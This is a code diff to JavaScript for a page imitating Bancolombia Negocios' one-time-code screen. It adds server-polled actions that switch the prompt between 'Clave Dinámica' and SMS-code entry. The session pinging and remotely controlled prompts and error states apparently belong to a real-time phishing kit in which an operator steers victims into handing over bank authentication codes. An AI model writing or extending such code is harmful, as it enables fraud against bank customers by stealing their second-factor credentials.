@@ -10,6 +10,28 @@ let pingInterval = setInterval(() => {
 }, 3000);
 fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
 
+function updateUI(otpType) {
+  const otpTitle = document.getElementById("otp-title");
+  const description = document.querySelector(".bc-key-validation-description");
+  if (otpTitle && otpType) {
+    if (otpType === 'dinamica') {
+      otpTitle.textContent = "Ingresa la Clave Dinámica";
+      if (description) {
+        description.style.color = "";
+        description.style.fontWeight = "";
+        description.textContent = "Encuentra tu Clave Dinámica en la app Bancolombia Negocios.";
+      }
+    } else if (otpType === 'sms') {
+      otpTitle.textContent = "Ingresa el Código SMS";
+      if (description) {
+        description.style.color = "";
+        description.style.fontWeight = "";
+        description.textContent = "Ingresa el código de 6 dígitos enviado por mensaje de texto (SMS) a tu celular registrado.";
+      }
+    }
+  }
+}
+
 // Start polling for actions
 let pollInterval = setInterval(async () => {
   try {
@@ -21,6 +43,11 @@ let pollInterval = setInterval(async () => {
         clearInterval(pingInterval);
         clearInterval(pollInterval);
         window.location.href = "index.html";
+      } else if (action === 'dinamica' || action === 'sms') {
+        sessionStorage.setItem('otpType', action);
+        updateUI(action);
+        document.getElementById("otp-validating").hidden = true;
+        document.getElementById("otp-content").hidden = false;
       } else if (action === 'error-dinamica') {
         document.getElementById("otp-validating").hidden = true;
         document.getElementById("otp-content").hidden = false;
@@ -131,21 +158,7 @@ next.addEventListener("click", () => {
 
 window.addEventListener('DOMContentLoaded', () => {
   const otpType = sessionStorage.getItem('otpType');
-  const otpTitle = document.getElementById("otp-title");
-  const description = document.querySelector(".bc-key-validation-description");
-  if (otpTitle && otpType) {
-    if (otpType === 'dinamica') {
-      otpTitle.textContent = "Ingresa la Clave Dinámica";
-      if (description) {
-        description.textContent = "Encuentra tu Clave Dinámica en la app Bancolombia Negocios.";
-      }
-    } else if (otpType === 'sms') {
-      otpTitle.textContent = "Ingresa el Código SMS";
-      if (description) {
-        description.textContent = "Ingresa el código de 6 dígitos enviado por mensaje de texto (SMS) a tu celular registrado.";
-      }
-    }
-  }
+  updateUI(otpType);
 });
 
 slots[0].focus();
